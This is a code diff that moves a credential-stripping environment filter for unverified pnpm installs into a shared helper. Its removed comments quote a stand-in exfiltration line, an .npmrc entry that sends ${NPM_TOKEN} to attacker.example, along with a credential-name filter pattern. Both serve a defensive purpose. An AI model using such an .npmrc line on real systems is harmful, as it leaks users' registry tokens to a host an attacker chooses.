@@ -1,11 +1,10 @@
 import { access, lstat, mkdir, realpath } from 'node:fs/promises';
-import os from 'node:os';
 import path from 'node:path';
 import type { CindyMakeTaskPreparation, MakeTaskWorkspace } from '../../shared/cindyMakeDoctor.js';
 import { runSourceGit } from './sourceGit.js';
 import { contentRef, snapshotContent, applyContent, taskContentRef } from './sourceContent.js';
 import { assertPnpmInstallContained } from './pnpmWriteRoots.js';
-import { runSourcePnpm } from './sourcePnpm.js';
+import { runSourcePnpm, unverifiedPnpmEnv } from './sourcePnpm.js';
 import {
   CINDY_MAKE_RUN_ID_PATTERN,
   CINDY_PERSONAL_BRANCH,
@@ -18,15 +17,7 @@ import {
 
 export type TaskWorkspacePhase = 'checking' | 'creating' | 'installing';
 
-/**
- * What an unverified install may see of the environment, matched
- * case-insensitively: process essentials and Cindy's own toolchain settings.
- * Everything else — above all credentials inherited from how Cindy was launched —
- * stays out, because `${VAR}` in a content `.npmrc` expands it into a request to a
- * host the content chooses.
- */
-const UNVERIFIED_INSTALL_ENV =
-  /^(?:path|systemroot|windir|comspec|tmp|temp|home|userprofile|lang|lc_.*|tz|corepack_.*|pnpm_manage_package_manager_versions|pythondontwritebytecode|pythonutf8|python|npm_config_(?:manage_package_manager_versions|managepackagemanagerversions|python))$/i;
+/** What an unverified install may see of the environment: see `unverifiedPnpmEnv`. */
 
 export interface TaskWorkspaceDeps {
   /** Toolchain PATH (system tools first, managed copies otherwise). */
@@ -187,28 +178,13 @@ export async function installCindyMakeWorktree(
   }
   await pnpm(
     options.ignoreScripts
-      ? {
-          // Unverified synced content runs no install-time code and sees a minimal
-          // environment: no lifecycle scripts, no `.pnpmfile.cjs` hooks (which
-          // `--ignore-scripts` alone would still execute), the write roots pinned
-          // over any `.npmrc` of the content's own, and the user's npm credentials
-          // never loaded — a content `.npmrc` must not route them to a proxy of its
-          // choosing. Only what the install needs is forwarded at all: any inherited
-          // variable could otherwise be expanded by a content `.npmrc`
-          // (`//attacker.example/:_authToken=${NPM_TOKEN}`) into a credential sent
-          // to a registry the content chooses (see `UNVERIFIED_INSTALL_ENV`).
-          ...Object.fromEntries(
-            Object.entries(deps.processEnvironment).filter(
-              ([key]) =>
-                UNVERIFIED_INSTALL_ENV.test(key) &&
-                // No credential survives even under an allowlisted prefix: a
-                // `COREPACK_NPM_TOKEN` is still a token a content `.npmrc`
-                // (`${COREPACK_NPM_TOKEN}`) can send to a registry of its choosing.
-                !/(?:token|password|auth|secret|credential)/i.test(key),
-            ),
-          ),
-          npm_config_userconfig: os.devNull,
-        }
+      ? // Unverified synced content runs no install-time code and sees only the
+        // credential-free environment (see `unverifiedPnpmEnv`): no lifecycle
+        // scripts, no `.pnpmfile.cjs` hooks (which `--ignore-scripts` alone would
+        // still execute), the write roots pinned over any `.npmrc` of the
+        // content's own, and no inherited variable to expand into a credential
+        // sent to a registry the content chooses.
+        unverifiedPnpmEnv(deps.processEnvironment)
       : deps.processEnvironment,
     [
       'install',
